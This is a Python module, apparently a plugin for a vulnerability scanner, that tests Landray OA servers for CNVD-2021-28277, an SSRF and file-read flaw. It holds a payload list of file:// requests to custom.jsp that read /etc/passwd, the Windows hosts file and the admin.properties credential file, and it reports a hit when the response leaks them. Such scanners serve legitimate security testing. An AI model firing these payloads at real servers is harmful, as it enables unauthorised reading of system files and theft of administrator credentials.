#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cnvd_2021_28277_payloads = [
    {
        'path': 'sys/ui/extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file:///etc/passwd"}}'
    },
    {
        'path': 'sys/ui/extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file://C:/Windows/System32/drivers/etc/hosts"}}'
    },
    {
        'path': 'sys/ui/extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file://C:\Windows\System32\drivers\etc\hosts"}}'
    },
    {
        'path': 'sys/ui/extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    },
        {
        'path': 'ui/extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file:///etc/passwd"}}'
    },
    {
        'path': 'ui/extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file://C:/Windows/System32/drivers/etc/hosts"}}'
    },
    {
        'path': 'ui/extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file://C:\Windows\System32\drivers\etc\hosts"}}'
    },
        {
        'path': 'ui/extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    },
        {
        'path': 'extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file:///etc/passwd"}}'
    },
    {
        'path': 'extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file://C:/Windows/System32/drivers/etc/hosts"}}'
    },
    {
        'path': 'extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"file://C:\Windows\System32\drivers\etc\hosts"}}'
    },
    {
        'path': 'extend/varkind/custom.jsp',
        'data': 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    },
    {
        'path': 'custom.jsp',
        'data': 'var={"body":{"file":"file:///etc/passwd"}}'
    },
    {
        'path': 'custom.jsp',
        'data': 'var={"body":{"file":"file://C:/Windows/System32/drivers/etc/hosts"}}'
    },
    {
        'path': 'custom.jsp',
        'data': 'var={"body":{"file":"file://C:\Windows\System32\drivers\etc\hosts"}}'
    },
    {
        'path': 'custom.jsp',
        'data': 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    },
]

def cnvd_2021_28277_scan(clients):
    ''' CNVD-2021-28277, 首次公开日期为2021-04-15, 蓝凌oa存在多个漏洞, 攻击者可利用该漏洞获取服务器控制权 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Landray-OA',
        'vul_type': 'SSRF',
        'vul_id': 'CNVD-2021-28277',
    }

    for payload in cnvd_2021_28277_payloads:
        path = payload['path']
        data = payload['data']

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)
            or (('password' in res.text) and ('kmss.properties.encrypt.enabled = true' in res.text))
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res,
                # 'Default SceretKey': 'kmssAdminKey'
            }
            return results
    return None
